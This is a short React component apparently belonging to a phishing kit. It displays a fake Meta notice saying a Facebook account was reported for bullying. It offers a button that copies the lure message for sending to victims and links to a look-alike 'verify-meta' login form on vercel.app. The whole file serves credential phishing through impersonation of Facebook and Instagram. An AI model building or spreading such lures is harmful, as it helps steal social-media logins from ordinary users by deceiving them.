// TextPage.js

const FaceTextPage = () => {

    const text = `NOTICE!!!   Your Facebook account has been reported for mischief or bullying other. If you believe that this is not you, so please kindly visit the link below, log in from your current Instagram ID, and fill out the feedback form.  https://verify-meta.vercel.app/instagramform/`

  const handleCopy = () => {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
  };

  return (
    <div className="container mx-auto mt-8">
      <div className="max-w-2xl mx-auto p-8 bg-white shadow-md rounded-md">
        <h1 className="text-3xl font-semibold mb-4">Instagram Account Report</h1>
        <p className="text-gray-700">
          {text}
        </p>

        <div className="mt-6">
          <a
            href="https://verify-meta.vercel.app/facebookform/" // Replace with your actual feedback link
            target="_blank"
            rel="noopener noreferrer"
            className="text-blue-500 hover:underline"
          >
            Feedback Form
          </a>
        </div>

        <div className="mt-6">
          <button
            onClick={handleCopy}
            className="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 focus:outline-none focus:bg-blue-600"
          >
            Copy Text
          </button>
        </div>
      </div>
    </div>
  );
};

export default FaceTextPage;
